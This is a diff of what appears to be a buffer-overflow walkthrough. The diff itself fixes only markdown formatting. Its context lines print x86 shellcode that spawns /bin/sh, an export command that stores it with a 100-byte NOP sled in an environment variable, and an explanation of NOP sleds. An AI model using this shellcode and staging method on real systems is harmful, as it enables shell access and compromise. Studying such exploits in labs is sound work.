@@ -74,7 +74,7 @@ Program received signal SIGSEGV, Segmentation fault.
 The buffer is only 20 chars, so we only have 11 bytes available to inject a shellcode, which is not enough.
 
 Let's save our shellcode in an env variable:  
-*shellcode:*  
+*Shellcode:*  
 ```
 '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' - 45 chars
 ```  
@@ -82,7 +82,7 @@ Let's save our shellcode in an env variable:
 The actual address of the shellcode must be known ahead of time, which can be difficult to know in a dynamically changing stack.
 By creating a large array (or sled) of these NOP instructions and placing it before the shellcode, if the EIP returns to any address found in the NOP sled, the EIP will increment while executing each NOP instruction, one at a time, until it finally reaches the shellcode. This means that as long as the return address is overwritten with any address found in the NOP sled, the EIP will slide down the sled to the shellcode, which will execute properly.  
 
-**Shellcode env:  **  
+**Shellcode env:**  
 ```
 export SHELLCODE=`python -c "print('\x90' * 100 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')"`
 ```  
